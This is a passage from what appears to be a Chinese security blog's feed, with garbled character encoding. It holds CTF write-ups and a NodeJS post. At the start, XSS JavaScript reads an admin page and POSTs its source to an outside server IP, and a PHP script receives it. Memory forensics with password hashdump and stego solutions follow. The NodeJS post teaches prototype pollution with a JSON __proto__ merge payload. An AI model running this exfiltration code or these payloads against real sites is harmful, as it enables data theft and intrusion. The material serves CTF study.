&#125; catch(e) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">createXmlHttp();</span><br><span class="line">xmlHttp.onreadystatechange = function()&#123;</span><br><span class="line">  <span class="keyword">if</span> (xmlHttp.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">        code=escape(xmlHttp.responseText);</span><br><span class="line">        createXmlHttp();</span><br><span class="line">        url = <span class="string">&quot;http://39.105.158.221:1215/re.php&quot;</span>;   //è¿™é‡Œæ˜¯æˆ‘ä»¬æœåŠ¡å™¨æ¥å—çš„åœ°å€</span><br><span class="line">        cc = <span class="string">&quot;htmlcode=&quot;</span> + code +<span class="string">&quot;&amp;filename=index.html&quot;</span>;</span><br><span class="line">        xmlHttp.open(<span class="string">&quot;POST&quot;</span>, url, true);</span><br><span class="line">        xmlHttp.setRequestHeader(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">        xmlHttp.send(cc)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlHttp.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/admin_shark.php&quot;</span>, true);//è¿™å—å¡«å†™è·å¾—çš„åå°åœ°å€ã€‚</span><br><span class="line">xmlHttp.setRequestHeader(<span class="string">&quot;Referer&quot;</span>, <span class="string">&quot;http://127.0.0.1/&quot;</span>);</span><br><span class="line">xmlHttp.send(null);</span><br></pre></td></tr></table></figure>

<p>æ¥æ”¶æºç EXP</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        function js_unescape($str) &#123;</span><br><span class="line">                $ret = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                $len = strlen($str);</span><br><span class="line">                <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; $len;$i++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> ($str[$i] == <span class="string">&#x27;%&#x27;</span> &amp;&amp; $str[$i + <span class="number">1</span>] == <span class="string">&#x27;u&#x27;</span>) &#123;</span><br><span class="line">                                $val = hexdec(substr($str, $i + <span class="number">2</span>, <span class="number">4</span>));</span><br><span class="line">                                <span class="keyword">if</span> ($val &lt; <span class="number">0x7f</span>) $ret.= chr($val);</span><br><span class="line">                                <span class="keyword">else</span> <span class="keyword">if</span> ($val &lt; <span class="number">0x800</span>) $ret.= chr(<span class="number">0xc0</span> | ($val &gt;&gt; <span class="number">6</span>)) . chr(<span class="number">0x80</span> | ($val &amp; <span class="number">0x3f</span>));</span><br><span class="line">                                <span class="keyword">else</span> $ret.= chr(<span class="number">0xe0</span> | ($val &gt;&gt; <span class="number">12</span>)) . chr(<span class="number">0x80</span> | (($val &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3f</span>)) . chr(<span class="number">0x80</span> | ($val &amp; <span class="number">0x3f</span>));</span><br><span class="line">                                $i+= <span class="number">5</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($str[$i] == <span class="string">&#x27;%&#x27;</span>) &#123;</span><br><span class="line">                                $ret.= urldecode(substr($str, $i, <span class="number">3</span>));</span><br><span class="line">                                $i+= <span class="number">2</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> $ret.= $str[$i];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> $ret;</span><br><span class="line">        &#125;</span><br><span class="line">        $data = js_unescape($_POST[<span class="string">&#x27;htmlcode&#x27;</span>]);  //å¯¹è·å¾—æºç js_unescapeè§£ç ã€‚</span><br><span class="line">        $filename = $_POST[<span class="string">&#x27;filename&#x27;</span>] . date(<span class="string">&quot;y-m-d-h-i-s&quot;</span>) . <span class="string">&quot;.html&quot;</span>;</span><br><span class="line">        $myfile = fopen($filename, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">        fwrite($myfile, $data);</span><br><span class="line">        fclose($myfile);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨contentå¤„è®¿é—®CSRFè¡¨å•å³å¯</p>
<img src="http://img.kawhi.xyz/image-20200616230446072.png" alt="image-20200616230446072" style="high:80%;width:80%;" />

<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="pyå—ï¼Ÿ"><a href="#pyå—ï¼Ÿ" class="headerlink" title="pyå—ï¼Ÿ"></a><strong>pyå—ï¼Ÿ</strong></h2><p>é¢˜ç›®æ˜¯ä¸€å¼ è€å¤–ç©¿ç€pythonæ–‡åŒ–è¡«çš„å›¾ç‰‡ã€‚</p>
<p>ä¿®æ”¹æ­£å¸¸é«˜åº¦æ¢å¤æ­£å¸¸çš„crc32æ ¡éªŒã€‚</p>
<p>ç„¶åStegsolve-&gt;Analyse-&gt;Data Extract</p>
<p>å‘ç°base64ï¼Œè§£ç å³å¯å¾—åˆ°flagã€‚</p>
<h2 id="å¤æ—¥è®¡åˆ’"><a href="#å¤æ—¥è®¡åˆ’" class="headerlink" title="å¤æ—¥è®¡åˆ’"></a>å¤æ—¥è®¡åˆ’</h2><p>ä¸‹è½½ä¸‹æ¥æ˜¯æ‹–è¿›010å‘ç°æ˜¯ä¸€ä¸ªRARå‹ç¼©æ–‡ä»¶ï¼Œç”¨360è§£å‹æ‰“å¼€ç›´æ¥æ‹–å‡ºæ¥å³å¯ã€‚å‘ç°secret.raræŸåï¼Œç”¨WinRARä¿®å¤ï¼Œæ‰“å¼€å‘ç°å››ä¸ªæ–‡ä»¶ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secret<span class="number">-1</span></span><br><span class="line">secret<span class="number">-2</span></span><br><span class="line">secret<span class="number">-3</span></span><br><span class="line">secret<span class="number">-4</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçœ‹å®˜æ–¹wpæ˜¯ä¼ªåŠ å¯†ä¿®æ”¹è¿™é‡Œã€‚</p>
<img src="http://img.kawhi.xyz/image-20200616091015847.png" alt="image-20200616091015847" style="high:80%;width:80%;" />

<p>ç„¶åæ–‡ä»¶4åˆ1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">copy /b <span class="number">1</span>+<span class="number">2</span>+<span class="number">3</span>+<span class="number">4</span> new.txt</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ä½¿ç”¨gnuplotè½¬åŒ–å›¾åƒï¼Œä¹Ÿå¯ä½¿ç”¨PIL</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">140</span>,<span class="number">140</span>),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">&#x27;new.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    point = line.split()</span><br><span class="line">    img.putpixel((int(point[<span class="number">0</span>]),int(point[<span class="number">1</span>])),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">f.close()</span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°æ±‰ä¿¡ç æ‰«ç å¯å¾—flagã€‚</p>
<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>åœ¨wiresharké‡Œé¢å¯¼å‡ºHttpå¯¹è±¡åˆ—è¡¨ï¼Œå‘ç°flag.jpgï¼Œæ”¹zipåç¼€</p>
<img src="http://img.kawhi.xyz/image-20200616104946314.png" alt="image-20200616104946314" style="high:80%;width:80%;" />

<p>ç„¶åcrc32è§£å¯†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python crc32.py reverse <span class="number">0xC</span>RC32</span><br></pre></td></tr></table></figure>

<p>è¿èµ·æ¥å³å¯å¾—åˆ°flagã€‚</p>
<h2 id="easy-analysis"><a href="#easy-analysis" class="headerlink" title="easy_analysis"></a>easy_analysis</h2><p>ä½¿ç”¨çš„æ˜¯windowsç‰ˆ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">volatility.exe -f memory imageinfo <span class="comment">#åˆ¤æ–­ç³»ç»Ÿï¼ŒçŒœæµ‹ä¸º win7SP1X64</span></span><br><span class="line">volatility.exe -f memory --profile=Win7SP1x64 pslist <span class="comment">#æŸ¥çœ‹è¿›ç¨‹ </span></span><br><span class="line">volatility.exe -f memory --profile=Win7SP1x64 cmdscan <span class="comment">#æŸ¥çœ‹å‘½ä»¤è¡Œè®°å½•ï¼Œå‘ç°flag æ–‡ä»¶å¤¹ã€‚ </span></span><br><span class="line">volatility.exe -f memory --profile=Win7SP1x64 filescan|findstr <span class="string">&quot;flag&quot;</span> <span class="comment">#å°è¯•æŸ¥æ‰¾å¸¦ flag çš„æ–‡ä»¶å‘ç°ä¸€ä¸ª analyse.zip æ–‡ä»¶ </span></span><br><span class="line">volatility.exe -f memory --profile=Win7SP1x64 dumpfiles -Q <span class="number">0x000000001e85f430</span> --dump-dir=outdir <span class="comment">#å¯¼å‡ºæ–‡ä»¶ï¼Œä¿®æ”¹æ–‡ä»¶å </span></span><br><span class="line">volatility.exe -f memory --profile=Win7SP1x64 hashdump <span class="comment">#æŸ¥çœ‹å¯†ç ï¼Œä½¿ç”¨md5è§£å¯†è§£å‡ºå¯†ç AaBbCc123</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨å¯†ç è§£å‹usbæµé‡åŒ…</p>
<p>usbæµé‡åˆ†æï¼š<a style="text-decoration:none;" class="foo" href="http://www.ga1axy.top/index.php/archives/10/" target="_blank">ä¼ é€é—¨</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tshark -r usb.pcap -T fields -e usb.capdata | sed â€˜/^\s*$/dâ€™ &gt; usbdata.txt</span><br></pre></td></tr></table></figure>

<p>base64éšå†™ï¼š<a style="text-decoration:none;" class="foo" href="https://www.jianshu.com/p/48fe4dd3e5ce" target="_blank">ä¼ é€é—¨</a></p>
<p>åˆ†ç¦»æ•°æ®ï¼Œbreakautokey.pyçˆ†ç ´ï¼Œå¾—åˆ°å‹ç¼©åŒ…å¯†ç THISKEYBOARDSUCKSFORYOUï¼Œç„¶åå†base64éšå†™è§£å¼€å³å¯å¾—åˆ°flagã€‚</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="çœŸÂ·ç­¾åˆ°"><a href="#çœŸÂ·ç­¾åˆ°" class="headerlink" title="çœŸÂ·ç­¾åˆ°"></a>çœŸÂ·ç­¾åˆ°</h2><p>ä»æ–‡ä»¶æå–å‡ºä¸€æ®µå­—ç¬¦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">R00yVE1NWlRIRTJFRU5CWUdVM1RNUlJURzRaVEtOUllHNFpUTU9CV0lJM0RRTlJXRzQ0VE9OSlhHWTJET05aUkc1QVRPTUJUR0kyRUVNWlZHNDNUS05aWEc0MlRHTkpaR1pBVElNUldHNDNUT05KVUc0M0RPTUJXR0kyRUtOU0ZHTTRUT09CVUc0M0VFPT09Cgo=</span><br></pre></td></tr></table></figure>

<p>CyberChefç½‘ç«™</p>
<p>base64-base32-é­”æ³•æ£’å³å¯å¾—åˆ°flagã€‚</p>
]]></content>
      <categories>
        <category>CTFæ¯”èµ›</category>
      </categories>
  </entry>
  <entry>
    <title>NodeJså­¦ä¹ </title>
    <url>/2020/07/20/NodeJs%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h1><p>å­¦ä¹ ä¸€æ³¢NodeJs</p>
<h1 id="åŸå‹"><a href="#åŸå‹" class="headerlink" title="åŸå‹"></a><strong>åŸå‹</strong></h1><p>é¦–å…ˆè¦ææ¸…æ¥š<code>prototype</code>ï¼Œ<code>__proto__</code>ï¼Œ<code>constructor</code>è¿™ä¸‰ä¸ªä¸œè¥¿ã€‚</p>
<p>åœ¨JSä¸­ï¼Œå£°æ˜ä¸€ä¸ªå‡½æ•°Fooçš„åŒæ—¶ï¼Œæµè§ˆå™¨ä¼šåœ¨å†…å­˜ä¸­åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åFooå‡½æ•°é»˜è®¤æœ‰ä¸€ä¸ªå±æ€§<code>prototype</code>æŒ‡å‘äº†è¿™ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å°±æ˜¯å‡½æ•°Fooçš„<strong>åŸå‹å¯¹è±¡</strong>ï¼Œç®€ç§°ä¸ºå‡½æ•°çš„åŸå‹ã€‚è¿™ä¸ªå¯¹è±¡é»˜è®¤ä¼šæœ‰ä¸ªå±æ€§<code>constructor</code>æŒ‡å‘äº†è¿™ä¸ªå‡½æ•°Fooã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(Foo.prototype)<span class="comment">//Foo &#123;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(Foo.prototype.constructor)<span class="comment">//[Function: Foo]</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å‡½æ•°Fooåˆ›å»ºä¸€ä¸ªå®ä¾‹å¯¹è±¡fooï¼Œfooé»˜è®¤ä¼šæœ‰ä¸€ä¸ªå±æ€§<code>__proto__</code>æŒ‡å‘äº†å‡½æ•°Fooçš„åŸå‹å¯¹è±¡ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> foo = <span class="keyword">new</span> Foo();</span><br><span class="line"><span class="built_in">console</span>.log(Foo.prototype)<span class="comment">//Foo &#123;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.__proto__)<span class="comment">//Foo &#123;&#125;</span></span><br><span class="line"><span class="comment">//Foo.prototype == foo.__proto__</span></span><br></pre></td></tr></table></figure>

<p>åŸå‹é“¾æ˜¯å°±æ˜¯æ¯”å¦‚å¯¹è±¡è°ƒç”¨ä¸€ä¸ªå±æ€§eatçš„æ—¶å€™</p>
<ol>
<li>åœ¨å¯¹è±¡Leeä¸­å¯»æ‰¾eatå±æ€§</li>
<li>å¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™åœ¨<code>Lee.__proto__</code>ä¸­å¯»æ‰¾eatå±æ€§</li>
<li>å¦‚æœä»ç„¶æ‰¾ä¸åˆ°ï¼Œåˆ™ç»§ç»­åœ¨<code>Lee.__proto__.__proto__</code>ä¸­å¯»æ‰¾eatå±æ€§</li>
<li>ä¾æ¬¡å¯»æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°<code>null</code>ç»“æŸã€‚æ¯”å¦‚ï¼Œ<code>Object.prototype</code>çš„<code>__proto__</code>å°±æ˜¯<code>null</code></li>
</ol>
<img src="http://img.kawhi.xyz/image-20200719212225968.png" style="high:100%;width:100%;" />

<p><strong>å°ç»“</strong></p>
<ul>
<li><p>å¯¹è±¡æœ‰<code>__proto__</code> å’Œ <code>constructor</code>ä¸¤ç§å±æ€§ã€‚</p>
<p>å¯¹è±¡çš„<code>__proto__</code>å±æ€§ï¼ŒæŒ‡å‘å¯¹è±¡æ‰€åœ¨å‡½æ•°çš„<code>prototype</code>å±æ€§ã€‚</p>
<p>å¯¹è±¡çš„<code>constructor</code>å±æ€§å°±æ˜¯<strong>æŒ‡å‘è¯¥å¯¹è±¡çš„æ„é€ å‡½æ•°</strong>ï¼Œæ‰€æœ‰å‡½æ•°æœ€ç»ˆçš„æ„é€ å‡½æ•°éƒ½æŒ‡å‘<strong>Function</strong>ã€‚</p>
</li>
<li><p>å‡½æ•°æœ‰<code>prototype</code> å’Œ <code>__proto__</code> å’Œ <code>constructor</code> ä¸‰ç§å±æ€§ã€‚</p>
<p>å‡½æ•°çš„<code>prototype</code>æŒ‡å‘è¿™ä¸ªå‡½æ•°çš„åŸå‹å¯¹è±¡ï¼Œå¹¶ä¸”<code>prototype</code>æ˜¯å‡½æ•°ç‰¹æœ‰çš„å±æ€§ã€‚</p>
</li>
</ul>
<p>é¢˜å¤–è¯ï¼šES6æ¨¡æ¿å­—ç¬¦ä¸²</p>
<p>ç”¨åå¼•å·é‡Œé¢å¯ä»¥åŠ å…¥æ¨¡æ¿ï¼Œä¾‹å¦‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fruit = <span class="string">&#x27;apple&#x27;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`i like <span class="subst">$&#123;fruit&#125;</span> very much`</span>);</span><br></pre></td></tr></table></figure>

<p>è¾“å‡º</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i like apple very much</span><br></pre></td></tr></table></figure>

<h1 id="åŸå‹é“¾æ±¡æŸ“"><a href="#åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“"></a><strong>åŸå‹é“¾æ±¡æŸ“</strong></h1><p>JSçš„è¿™ç§ç»§æ‰¿æ˜¯åŠ¨æ€çš„ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.first_name = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="built_in">this</span>.last_name = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.first_name = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Son.prototype = <span class="keyword">new</span> Father()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> Son()</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)<span class="comment">//Name: Melania Trump</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¿®æ”¹ä¸€ä¸‹ä»£ç </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.first_name = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="built_in">this</span>.last_name = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.first_name = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Son.prototype = <span class="keyword">new</span> Father()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> Son()</span><br><span class="line">son.__proto__[<span class="string">&#x27;add_name&#x27;</span>] = <span class="string">&#x27;kk&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> son1 = <span class="keyword">new</span> Son();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`son Name: <span class="subst">$&#123;son.add_name&#125;</span>`</span>);<span class="comment">//son Name: kk</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`son1 Name: <span class="subst">$&#123;son1.add_name&#125;</span>`</span>);<span class="comment">//son1 Name: kk</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥æƒŠè®¶çš„å‘ç°ä¸€ä¸ªå¯¹è±¡sonä¿®æ”¹è‡ªèº«çš„åŸå‹çš„å±æ€§çš„æ—¶å€™ä¼šå½±å“åˆ°å¦å¤–ä¸€ä¸ªå…·æœ‰ç›¸åŒåŸå‹çš„å¯¹è±¡son1ã€‚ç”šè‡³å¯ä»¥å†ä¸Šä¸€å±‚ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">son.__proto__.__proto__[<span class="string">&#x27;boy&#x27;</span>] = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(son1.boy);<span class="comment">//123</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥å¯¹æ¯”ä¸€ä¸‹javaçš„</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Test;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">Father</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Son</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.name = <span class="string">&quot;father&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">alert</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;i am son&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        Son s1 = <span class="keyword">new</span> Son();</span><br><span class="line">        System.out.println(s1.name);<span class="comment">//father</span></span><br><span class="line">        s1.name = <span class="string">&quot;son&quot;</span>;</span><br><span class="line">        System.out.println(s1.name);<span class="comment">//son</span></span><br><span class="line">        Son s2 = <span class="keyword">new</span> Son();</span><br><span class="line">        System.out.println(s2.name);<span class="comment">//father</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ä¸¤è€…çš„ç»§æ‰¿æ–¹å¼æœºåˆ¶å¯ä»¥è¯´å®Œå…¨ä¸ä¸€æ ·çš„ï¼Œä¸€ä¸ªæ˜¯åŸºäºå¯¹è±¡æ¥ç»§æ‰¿ï¼Œä¸€ä¸ªæ˜¯åŸºäºåŸå‹æ¥ç»§æ‰¿ã€‚</p>
<h2 id="åˆ©ç”¨æ‰‹æ®µ"><a href="#åˆ©ç”¨æ‰‹æ®µ" class="headerlink" title="åˆ©ç”¨æ‰‹æ®µ"></a><strong>åˆ©ç”¨æ‰‹æ®µ</strong></h2><p>ä»¥å¯¹è±¡mergeä¸ºä¾‹ï¼Œæˆ‘ä»¬æƒ³è±¡ä¸€ä¸ªç®€å•çš„mergeå‡½æ•°ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨åˆå¹¶çš„è¿‡ç¨‹ä¸­ï¼Œå­˜åœ¨èµ‹å€¼çš„æ“ä½œ<code>target[key] = source[key]</code>ï¼Œé‚£ä¹ˆï¼Œè¿™ä¸ªkeyå¦‚æœæ˜¯<code>__proto__</code>ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥åŸå‹é“¾æ±¡æŸ“å‘¢ï¼Ÿ</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)<span class="comment">//1 2</span></span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)<span class="comment">//undefined</span></span><br></pre></td></tr></table></figure>

<p>ç»“æœæ˜¯ï¼Œåˆå¹¶è™½ç„¶æˆåŠŸäº†ï¼Œä½†åŸå‹é“¾æ²¡æœ‰è¢«æ±¡æŸ“ã€‚</p>
<p>è¿™æ˜¯å› ä¸ºï¼Œæˆ‘ä»¬ç”¨JavaScriptåˆ›å»ºo2çš„è¿‡ç¨‹ï¼ˆ<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>ï¼‰ä¸­ï¼Œ<code>__proto__</code>å·²ç»ä»£è¡¨o2çš„åŸå‹äº†ï¼Œæ­¤æ—¶éå†o2çš„æ‰€æœ‰é”®åï¼Œä½ æ‹¿åˆ°çš„æ˜¯<code>[a, b]</code>ï¼Œ<code>__proto__</code>å¹¶ä¸æ˜¯ä¸€ä¸ªkeyï¼Œè‡ªç„¶ä¹Ÿä¸ä¼šä¿®æ”¹Objectçš„åŸå‹ã€‚</p>
<p>é‚£ä¹ˆï¼Œå¦‚ä½•è®©<code>__proto__</code>è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªé”®åå‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬å°†ä»£ç æ”¹æˆå¦‚ä¸‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯å› ä¸ºï¼ŒJSONè§£æçš„æƒ…å†µä¸‹ï¼Œ<code>__proto__</code>ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ï¼Œæ‰€ä»¥åœ¨éå†o2çš„æ—¶å€™ä¼šå­˜åœ¨è¿™ä¸ªé”®ã€‚</p>
<p>mergeæ“ä½œæ˜¯æœ€å¸¸è§å¯èƒ½æ§åˆ¶é”®åçš„æ“ä½œï¼Œä¹Ÿæœ€èƒ½è¢«åŸå‹é“¾æ”»å‡»ï¼Œå¾ˆå¤šå¸¸è§çš„åº“éƒ½å­˜åœ¨è¿™ä¸ªé—®é¢˜ã€‚</p>
<h2 id="hackit-2018"><a href="#hackit-2018" class="headerlink" title="hackit 2018"></a><strong>hackit 2018</strong></h2><p>å…³é”®ä»£ç å¦‚ä¸‹</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> user=[];</span><br><span class="line">app.get(<span class="string">&#x27;/admin&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; </span><br><span class="line">    <span class="comment">/*this is under development I guess ??*/</span></span><br><span class="line">    <span class="built_in">console</span>.log(user.admintoken);</span><br><span class="line">    <span class="keyword">if</span>(user.admintoken &amp;&amp; req.query.querytoken &amp;&amp; md5(user.admintoken) === req.query.querytoken)&#123;</span><br><span class="line">        res.send(<span class="string">&#x27;Hey admin your flag is &lt;b&gt;flag&#123;prototype_pollution_is_very_dangerous&#125;&lt;/b&gt;&#x27;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        res.status(<span class="number">403</span>).send(<span class="string">&#x27;Forbidden&#x27;</span>);</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line">app.post(<span class="string">&#x27;/api&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> client = req.body;</span><br><span class="line">    <span class="keyword">var</span> winner = <span class="literal">null</span>;</span><br><span class="line">    matrix[client.row][client.col] = client.data;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è·å–flagçš„æ¡ä»¶æ˜¯ä¼ å…¥çš„querytokenè¦å’Œuseræ•°ç»„æœ¬èº«çš„admintokençš„MD5å€¼ç›¸ç­‰ï¼Œä¸”äºŒè€…éƒ½è¦å­˜åœ¨ã€‚</p>
